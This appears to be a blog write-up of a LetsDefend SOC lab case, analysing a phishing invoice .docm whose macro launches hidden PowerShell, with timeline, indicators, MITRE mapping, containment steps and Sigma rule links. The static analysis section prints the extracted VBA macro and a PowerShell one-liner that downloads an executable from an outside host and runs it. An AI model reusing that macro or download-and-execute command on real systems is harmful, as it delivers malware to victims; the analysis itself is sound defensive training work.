---
title: "SOC205 Case Study: Malicious Macro Execution via Phishing Invoice"
date: 2026-01-19
tags: ["soc", "letsdefend", "malware", "phishing", "macros", "powershell", "incident-response"]
categories: ["SOC Analysis", "Malware Investigation"]
draft: false
---


**Alert Name:** SOC205 – Malicious Macro has been executed  
**Severity:** High  
**Event ID:** 231  
**Event Time:** Feb 28, 2024 – 08:42 AM  
**Category:** Malware  
**Platform:** LetsDefend SOC

## Executive Summary (Management / Business)

On February 28, 2024, a user received a malicious email that appeared to contain a legitimate invoice document. When the user opened the attachment, hidden malicious code inside the document was automatically executed.

This hidden code attempted to connect to an external system controlled by an attacker and download additional harmful software. Security monitoring systems detected this activity shortly after it occurred.

Although the malicious file was detected, it was not automatically blocked, which increased the risk to the affected system. As a precaution, the impacted computer was immediately isolated from the network, and all known malicious connections were blocked to prevent further damage.

There is no confirmed evidence of data loss at this time; however, the incident is considered high risk due to the nature of the attack. Additional security controls and user awareness measures are recommended to reduce the likelihood of similar attacks in the future.

## Technical Summary (Technical)
On February 28, 2024, a high-severity security alert (SOC205) was triggered after a user on host **Jayne (172.16.17.198)** executed a malicious macro-enabled Microsoft Word document (`edit1-invoice.docm`). The file was delivered via a phishing email and contained embedded VBA macros that executed automatically when the document was opened.

The macro launched a PowerShell command in a hidden window, which attempted to download an external executable (`messbox.exe`) from a remote server. Network and endpoint logs confirmed DNS resolution and outbound connection attempts to a known malicious IP address (**92.204.221.16**), indicating command-and-control (C2) communication activity.

The file hash was validated using VirusTotal and Hybrid Analysis, where it was classified as malicious by multiple engines. The document was not quarantined, and macro execution was allowed on the system, increasing the risk of compromise. Immediate response actions included isolating the affected host, removing the phishing email, blocking identified indicators of compromise (IOCs), and preserving forensic artifacts.

This incident was confirmed as a **True Positive** and represents a successful macro-based malware execution attempt via phishing.

---
## 1. Alert Overview

A high-severity malware alert was triggered after a **macro-enabled Microsoft Word document (.docm)** was executed on the host **Jayne**. Macro-enabled Office documents are frequently abused in phishing campaigns to deliver malware through embedded VBA code that launches PowerShell or command-line payloads.

In this incident, the document successfully executed a malicious macro, resulting in outbound communication attempts to a known malicious command-and-control (C2) infrastructure.
### 2. Key Event Details
| Field               | Value                                                            |
| ------------------- | ---------------------------------------------------------------- |
| Hostname            | Jayne                                                            |
| Source IP           | 172.16.17.198                                                    |
| File Name           | edit1-invoice.docm                                               |
| File Path           | C:\Users\LetsDefend\Downloads\edit1-invoice.docm                 |
| File Hash (SHA-256) | 1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0 |
| Trigger Reason      | Suspicious file detected on system                               |
| AV/EDR Action       | Detected                                                         |
| Quarantined         | No                                                               |
## 3. Threat Indicators Identified

- Macro-enabled Word document (.docm)
- Obfuscated VBA macro execution
- PowerShell execution triggered by macro
- DNS lookup and outbound traffic to known malicious IP
- Download-and-execute behavior

## 4. Malware Quarantine Status

- The malicious document **was not quarantined**
- Macro execution was **successful**
- Manual investigation and containment were required
## 5. Malware Analysis Tools Used

The file hash was analyzed using multiple third-party platforms:

- [VirusTotal](https://www.virustotal.com/gui/file/1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0)

![](https://i.ibb.co/vvrZZhqY/Pasted-image-20260127180540.png)
- [Hybrid Analysis](https://hybrid-analysis.com/search?query=1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0)
![](https://i.ibb.co/nNmDC5Vf/Pasted-image-20260127180647.png)


![](https://i.ibb.co/ymgwNSQj/Pasted-image-20260127180944.png)


### Analysis Results

- Multiple security engines flagged the document as **malicious**
- Classified as **Trojan / Macro-based malware**
- Embedded VBA macro detected in `ThisDocument.cls`
- Macro triggered PowerShell execution silently

This confirms the document was intentionally crafted for malicious execution.

## 6. Command-and-Control (C2) Communication Check
During log analysis, outbound activity related to the malicious macro was observed.
![](https://i.ibb.co/TBJFbFMZ/Pasted-image-20260127220435.png)

![](https://i.ibb.co/9HKyrs2D/Pasted-image-20260127220833.png)

**C2 IP Address Identified:**

- `92.204.221.16`
- [URLScan](https://urlscan.io/result/019bff81-53bd-77ce-9ffc-a2200a0d75b3/)

![](https://i.ibb.co/cStPfNsc/Pasted-image-20260127221321.png)
### Observed Behavior

- PowerShell initiated a DNS lookup for the C2 host    
- Outbound HTTP requests were observed
- Proxy and firewall logs confirmed attempted communication

**C2 Status:** Accessed 

This indicates the macro successfully reached out to external infrastructure.
## 7. Initial Access Vector – Phishing

Further investigation focused on how the file reached the host.
![](https://i.ibb.co/NgvKrKvN/Pasted-image-20260127222412.png)
### Findings
- A phishing email was received at **08:12 AM**
- Sender: `jake.admin[@]cybercommunity[.]info`
- The email contained a ZIP attachment
- At **08:41 AM**, the ZIP was extracted into the Downloads folder
- At **08:42 AM**, the document was opened and the macro executed

This confirms **phishing** as the initial access vector.
### 8. Malware Execution Timeline
![](https://i.ibb.co/wNnfVbqM/Pasted-image-20260127220503.png)
| Time     | Activity                      |
| -------- | ----------------------------- |
| 08:12 AM | Phishing email delivered      |
| 08:41 AM | Malicious ZIP extracted       |
| 08:42 AM | DOCM opened                   |
| 08:42 AM | Macro executes PowerShell     |
| 08:42 AM | DNS lookup to C2              |
| 08:42 AM | Script block execution logged |
![[Pasted image 20260127220503.png]]
## 9. Static Malware Analysis

Static analysis was performed in an isolated environment.

### Tools Used

- oleid
- olevba
- exiftool

### Results
```bash
File Name                       : edit1-invoice.docm
File Size                       : 24 kB
File Permissions                : -rw-r--r--
File Type                       : DOCM
File Type Extension             : docm
MIME Type                       : application/vnd.ms-word.document.macroEnabled.12
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x4c8f57fb
Zip Compressed Size             : 505
Zip Uncompressed Size           : 1945
Zip File Name                   : [Content_Types].xml
Template                        : Normal.dotm
Total Edit Time                 : 4 minutes
Pages                           : 1
Words                           : 4
Characters                      : 26
Application                     : Microsoft Office Word
Links Up To Date                : No
Characters With Spaces          : 29
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 12.0000
Creator                         : user1
Last Modified By                : Microsoft
Revision Number                 : 5
```

| Indicator              | Value                                        | Risk     | Description                                                                                                          |
| ---------------------- | -------------------------------------------- | -------- | -------------------------------------------------------------------------------------------------------------------- |
| File Format            | MS Word 2007+ Macro-Enabled Document (.docm) | Info     | Macro-enabled Word document format                                                                                   |
| Container Format       | OpenXML                                      | Info     | Standard Microsoft Office Open XML container                                                                         |
| Encrypted              | False                                        | None     | The file is not encrypted                                                                                            |
| VBA Macros             | Yes, suspicious                              | **High** | The file contains VBA macros with suspicious keywords. Further analysis recommended using **olevba** and **mraptor** |
| XLM Macros             | No                                           | None     | The file does not contain Excel 4.0 (XLM) macros                                                                     |
| External Relationships | 0                                            | None     | No remote templates, external OLE objects, or external references detected                                           |
#### Macro Execution Flow (Simplified)

1. User opens the Word document
2. ActiveX control (`InkEdit1`) gains focus
3. `InkEdit1_GotFocus()` macro executes
4. Macro reads a command from `UserForm1.TextBox1`
5. `cmd.exe` launches PowerShell silently
6. PowerShell downloads `messbox.exe`
7. File is saved locally as `mess.exe`
8. Downloaded executable is executed
**Extracted Malicious VBA Code:**
```vb
Sub InkEdit1_GotFocus()
    Run = Shell(UserForm1.TextBox1, 0)
End Sub
```
- `Shell(..., 0)` → Executes the command **with a hidden window**
- Command content is stored externally in a form object (evasion)
**Embedded Command Extracted from UserForm:**
```vb
cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile(
'http://www.greyhathacker.net/tools/messbox.exe',
'mess.exe'
); Start-Process 'mess.exe'
```
#### Behavior Breakdown
- Uses `cmd.exe` as an execution wrapper
- Launches PowerShell
- Downloads a remote payload
- Executes the payload immediately

- Macro presence confirmed
- VBA code executed shell commands
- Obfuscation present but not heavily layered
- PowerShell used as second-stage loader

The macro logic retrieves and executes a command stored within a form control, launching it with a hidden window style.
## 10. PowerShell Payload Behavior
![](https://i.ibb.co/2Y1QZLpB/Pasted-image-20260127220527.png)
The PowerShell command attempted to download a remote executable:
```powershell
(New-Object System.Net.WebClient).DownloadFile(
  'hxxp://www.greyhathacker.net/tools/messbox.exe',
  'mess.exe'
)
Start-Process 'mess.exe'
```
### Observations

- Download attempted from external web server
- HTTP response returned **404**, but DNS and connection attempts were logged
- Firewall logs showed traffic to **92.204.221.16**    

This confirms **attempted ingress tool transfer**.

## 11. Impact Assessment

- Malware Execution: **Yes**
- System Compromise: **Likely**
- Persistence Mechanisms: **Possible**
- Data Exposure: **Unknown**
- Business Impact: **High Risk**

## 12. Containment & Response Actions
![](https://i.ibb.co/8DndGxvy/Pasted-image-20260127220655.png)

- Isolated host **Jayne**
- Preserved forensic artifacts
- Blocked malicious IP and URL
- Removed phishing email
- Logged and defanged IOCs
- Closed alert as confirmed incident

## 13. MITRE ATT&CK Mapping
|Tactic|Technique|Technique ID|
|---|---|---|
|Initial Access|Phishing|**T1566**|
|Execution|Command and Scripting Interpreter (PowerShell)|**T1059.001**|
|Execution|User Execution – Malicious File|**T1204.002**|
|Command & Control|Application Layer Protocol|**T1071**|
|Command & Control|Ingress Tool Transfer|**T1105**|
## 14. Artifacts Collected
| Artifact     | Value                                                            |
| ------------ | ---------------------------------------------------------------- |
| Attacker IP  | 92.204.221.16                                                    |
| Sender Email | jake.admin[@]cybercommunity[.]info                               |
| Victim User  | jayne[@]letsdefend[.]io                                          |
| File         | edit1-invoice.docm                                               |
| Hash         | 1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0 |
| Dropped EXE  | mess.exe / messbox.exe                                           |

## 15. Sigma Rules
- [Office Macro Spawning PowerShell](https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC205%20-%20Malicious%20Macro%20has%20been%20executed/office_macro_spawning_powershell.yml)
- [PowerShell DownloadFile](https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC205%20-%20Malicious%20Macro%20has%20been%20executed/office_macro_spawning_powershell.yml)
- [Office Macro Hidden Execution (Shell with Hidden Window)](https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC205%20-%20Malicious%20Macro%20has%20been%20executed/office_macro_hidden_shell_execution.yml)
- [Office Dropping Executables (mess.exe pattern)](https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC205%20-%20Malicious%20Macro%20has%20been%20executed/powershell_downloadfile_mess_exe.yml)
## Final Verdict

**True Positive – Confirmed Malicious Macro Execution**

The macro-enabled Word document successfully executed malicious VBA code that launched PowerShell, attempted to download a remote payload, and communicated with external infrastructure. This incident represents a confirmed malware infection and required immediate containment.

## Analyst Note

This case demonstrates a classic phishing-based macro attack chain. Despite modern Office security controls, macro execution was permitted on the system, allowing the attacker to execute PowerShell silently. Strengthening macro policies, improving email filtering, and user awareness training are critical to preventing similar incidents.


![](https://i.ibb.co/mCm9jcF3/Pasted-image-20260128172817.png)



